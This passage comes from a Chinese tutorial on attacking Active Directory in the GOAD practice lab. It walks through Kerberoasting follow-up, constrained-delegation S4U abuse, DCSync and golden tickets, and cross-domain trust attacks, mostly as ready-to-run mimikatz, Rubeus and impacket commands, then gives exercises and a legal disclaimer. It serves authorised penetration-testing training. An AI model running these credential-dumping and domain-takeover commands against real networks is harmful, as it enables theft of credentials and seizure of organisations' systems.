6. **进一步利用**
```bash
# 如果svc_web权限较高
# 检查本地管理员权限
whoami /priv

# 抓取凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 或者继续Kerberoasting获取更多账号
```

**经验总结**：Kerberoasting是域渗透中非常高效的攻击手段，成功率高且难以检测。服务账号往往设置了较弱的密码且长期不变，是重点攻击目标。

---

### 案例3：委派攻击

**场景**：利用约束委派获取域控权限。

**详细步骤**：

1. **查找约束委派账号**
```powershell
# 使用PowerView查找
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto

# 或者使用BloodHound
# 查找"Allowed To Delegate"关系
```

2. **获取服务账号哈希**
```bash
# 假设通过Kerberoasting或其他方式获取了服务账号的NTLM哈希
# 用户：svc_delegation
# NTLM哈希：xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

3. **执行S4U攻击**
```bash
# 使用Rubeus
Rubeus.exe s4u /user:svc_delegation /rc4:NTLM_HASH /msdsspn:cifs/dc01.goad.local /impersonateuser:administrator /ptt

# 或者使用Impacket
impacket-getST goad.local/svc_delegation -hashes :NTLM_HASH -spn cifs/dc01.goad.local -impersonate administrator

# 注入票据
export KRB5CCNAME=administrator.ccache
```

4. **验证权限**
```bash
# 访问域控的C盘
dir \\dc01.goad.local\c$

# 使用wmiexec执行命令
impacket-wmiexec -k -no-pass dc01.goad.local

# 或者使用psexec
impacket-psexec -k -no-pass dc01.goad.local
```

5. **拿下域控**
```bash
# 获得域控权限后
# 导出所有哈希
impacket-secretsdump -k -no-pass dc01.goad.local

# 或者直接执行命令
whoami
hostname
```

**经验总结**：委派攻击是域渗透中非常强大的攻击手段，尤其是约束委派和资源型约束委派，往往能直接从普通用户权限跳到域控。在BloodHound中可以快速找到这类攻击路径。

---

### 案例4：DCSync利用

**场景**：利用DCSync权限导出域内所有用户哈希。

**详细步骤**：

1. **获取DCSync权限**
```bash
# 方法1：获取域管账号
# 通过各种手段获取域管理员的凭据

# 方法2：通过ACL配置
# 如果某个用户有DCSync权限，可以直接使用

# 方法3：登录域控
# 直接登录域控后导出哈希
```

2. **使用Mimikatz执行DCSync**
```bash
# 在域内任意机器上执行（需要有DCSync权限）
mimikatz.exe

# 导出所有用户哈希
lsadump::dcsync /domain:goad.local /all /csv

# 导出指定用户
lsadump::dcsync /domain:goad.local /user:krbtgt
lsadump::dcsync /domain:goad.local /user:administrator

# 退出
exit
```

3. **使用Impacket执行DCSync**
```bash
# 从攻击机远程执行
impacket-secretsdump goad.local/administrator:password@192.168.56.10

# 使用哈希
impacket-secretsdump -hashes :NTLM_HASH goad.local/administrator@192.168.56.10

# 使用Kerberos票据
impacket-secretsdump -k -no-pass dc01.goad.local
```

4. **使用获取的哈希**
```bash
# 制作黄金票据
mimikatz "kerberos::golden /user:hacker /domain:goad.local /sid:S-1-5-21-xxx /krbtgt:NTLM_HASH /ptt"

# Pass-the-Hash横向移动
impacket-psexec -hashes :NTLM_HASH administrator@192.168.56.21

# 破解高价值账号密码
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
```

**经验总结**：DCSync是域渗透的终极武器之一，一旦获得DCSync权限，就相当于控制了整个域。检测DCSync攻击需要监控域控之间的复制流量和异常的目录同步请求。

---

### 案例5：域信任攻击

**场景**：从essos.local域出发，通过信任关系攻击north.sevenkingdoms.local域。

**详细步骤**：

1. **枚举信任关系**
```powershell
# 查看当前域的信任
Get-NetDomainTrust

# 查看林信任
Get-NetForestTrust

# 使用nltest
nltest /domain_trusts /all_trusts
```

2. **发现信任关系**
```
# 发现essos.local和north.sevenkingdoms.local之间有信任关系
# 信任方向和类型需要确认
```

3. **获取信任密钥**
```bash
# 方法1：DCSync获取信任密码
# 在essos域控上执行DCSync
# 查找信任账户的哈希

# 方法2：从域控内存中抓取
mimikatz "privilege::debug" "sekurlsa::trustkeys" "exit"
```

4. **制作跨域票据**
```bash
# 使用Mimikatz创建信任票
# 然后访问信任域的资源

# 或者使用黄金票据
# 利用信任关系制作跨域黄金票据
```

5. **攻击信任域**
```bash
# 使用获得的权限访问north域
# 收集north域的信息
# 寻找north域中的漏洞
# 最终拿下north域控
```

6. **林攻击（进阶）**
```bash
# 如果有企业管理员权限
# 可以访问整个林中的所有域
# 获取林根域的krbtgt哈希
# 制作林范围的黄金票据
```

**经验总结**：域信任攻击是高级域渗透的重要内容，在复杂的企业环境中，域信任关系往往是攻击链中的关键一环。理解信任的方向和类型对于跨域攻击至关重要。

---

## 八、练习题

### 基础题（5道）

1. **什么是GOAD？它的全称是什么？GOAD相比其他域渗透靶场有哪些优势？**

2. **GOAD v2包含几台虚拟机？请画出网络拓扑图，说明每台机器的角色和所属域。**

3. **什么是Kerberoasting攻击？它的原理是什么？为什么这种攻击方式有效？请描述完整的攻击流程。**

4. **委派攻击有哪三种类型？请分别说明非约束委派、约束委派、资源型约束委派的原理和利用条件。**

5. **什么是DCSync攻击？它需要什么权限？执行DCSync有哪些工具和方法？**

### 进阶题（5道）

6. **请详细描述GOAD环境的搭建步骤，包括所需软件、硬件要求、网络配置、常见问题及解决方法。**

7. **请设计一条从普通域用户到拿下整个林权限的完整攻击路径，包含至少5个不同的攻击技术，并说明每一步的前提条件和利用方法。**

8. **ACL攻击是域渗透的重要方向，请列举至少5种危险的ACL权限，分别说明攻击原理、利用条件和利用方法。**

9. **域信任攻击有哪些类型？请详细说明如何从一个域出发，通过信任关系攻击另一个域，包括所需条件、攻击步骤和工具使用。**

10. **BloodHound是域渗透中非常重要的工具，请说明BloodHound的工作原理、数据收集方法、以及如何使用BloodHound寻找从普通用户到域管理员的攻击路径。**

---

## 安全提醒

> **⚠️ 重要声明**
>
> 本文档中的所有技术内容仅供学习和研究使用，仅适用于在**合法授权的靶场环境**中进行练习。
>
> - 请勿在未授权的任何系统上使用本文档中描述的技术
> - 请遵守《网络安全法》及相关法律法规
> - 任何未经授权的渗透测试行为均属于违法行为
> - 使用GOAD靶场时请遵守项目的开源协议
> - 学习过程中请尊重他人隐私和知识产权
> - 搭建GOAD环境时请使用合法授权的Windows系统镜像
>
> 安全技术应用于防护和建设，而非攻击和破坏。请树立正确的网络安全观，做遵纪守法的白帽黑客。
